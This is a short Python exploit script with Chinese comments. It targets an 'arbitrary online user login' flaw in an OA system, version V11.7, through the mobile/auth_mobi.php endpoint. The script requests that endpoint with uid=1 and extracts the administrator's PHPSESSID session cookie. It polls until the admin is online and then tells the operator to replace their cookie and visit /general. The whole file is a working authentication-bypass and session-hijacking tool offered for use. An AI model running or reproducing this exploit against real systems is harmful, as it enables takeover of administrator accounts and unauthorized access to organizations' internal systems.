import requests
import time
import re

RED = '\x1b[1;91m'
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
END = '\033[0m'

def Valid_login(host): ## 有效的任意用户登录 需要管理员在线
    print(CYAN + '[->] 正在检测是否存在<V11.7任意在线用户登录漏洞' + END)
    url = host + 'mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0'
    try:
        response = requests.get(url=url,timeout=2)
        # print(response.text)
        if 'RELOGIN' in response.text and response.status_code == 200:
            # print('[-] 目标用户处于下线状态\n')
            Valid_startlogin(url)
        else:
            PHPSESSION = re.findall(r'PHPSESSID=(.*?);',str(response.headers))[0]
            print(GREEN + '[*] 目标用户处于在线状态,PHPSESSID=',GREEN + PHPSESSION + END,sep='' + END)
            print(GREEN + '请修改cookie后访问/general\n' + END)
            time.sleep(2)
    except:
        pass

def Valid_startlogin(host): ## 监控uid=1登录用户
    print(CYAN + '[->] 1秒一次测试用户是否在线（检测三次如果需要长时间检测请修改relogin.py）' + END)
    i = 0
    try:
        while True:
            response = requests.get(url=host,timeout=2)
            if 'RELOGIN' in response.text and response.status_code == 200:
                print(RED + '[-] 目标用户处于下线状态\n ' + time.asctime() + END)
                time.sleep(1)
                i += 1
                if i == 3:
                    print(RED + '[-] 目标用户未在线\n' + END)
                    break
            else:
                cookie_key = response.cookies.keys()[0]  ## 拼接cookie
                cookie_value = response.cookies.values()[0]
                phpsession = cookie_key + '=' + cookie_value
                print(GREEN + '[*] 目标用户在线,cookie如下:\n' + time.asctime() + END)
                print(GREEN + phpsession + END)
                break
    except:
        pass

def run(host):
    Valid_login(host)